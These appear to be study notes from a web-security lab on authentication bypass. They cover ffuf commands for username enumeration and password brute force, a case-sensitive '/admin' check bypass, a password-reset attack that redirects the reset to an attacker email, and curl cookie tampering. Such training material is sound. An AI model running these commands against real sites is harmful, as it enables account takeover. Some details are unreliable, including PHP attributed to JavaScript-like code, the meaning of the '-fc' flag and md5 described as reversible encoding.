### Username Enumeration
1. Build a list of valid usernames (using ffuf)
2. Use brute force attack


#### Example - Finding Valid Usernames:
```bash
ffuf -w /usr/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://vulnerable_url -mr "username already exists"

#### Context:
names.txt: Contains list of usernames to check for existence.
FUZZ: Keyword signifies where the content of wordlist will be inserted.
-w: File's location.
-X: Request method.
-d: Data to send.
-H: Additional headers.
-u: URL the request is going to.
-mr: Text on the page we are searching for.

Save the list of usernames to a text file

#### Brute Force Attack:

ffuf -w valid_usernames.txt:W1,/usr/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://vulnerable_url -fc 200

#### Context:
W1: Usernames.
W2: Passwords.
-fc: Any HTTP status other than 200.



### Logic Flaw

if( url.substr(0,6) === '/admin') {
    # Code to check user is an admin
} else {
    # View Page
}

PHP uses === to check for an exact match including case.
An unauthenticated user requesting /adMin will bypass authentication checks and will have pages displayed.

#### Example - Resetting Victim's Password:
A victim's password can be reset by a hacker:
curl 'http://vulerable_url/users/reset?email=victim%40vulnerable_site.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=victim&email=attacker@hacker.com'

This works because the $_REQUEST variable contains data from the query string and POST data.
If the same key name is used for both, the logic favors the POST data field instead of the query string.



### Cookie Tampering:
1. View contents of cookie
2. Change contents of cookie

#### Example - Viewing cookie:
curl http://vulnerable_url/cookie-test

#### Example - Changing cookie:
curl -H "Cookie: logged_in=true; admin=true" http://vulnerable_url/cookie-test

#### Example - Viewing hashed or encoded cookies:
Common hashes of cookies (and their original strings) are stored in databases such as: https://crackstation.net/ 
Cookies are also commonly encoded with md5, base32, or base64, and can easily be decoded with online tools.
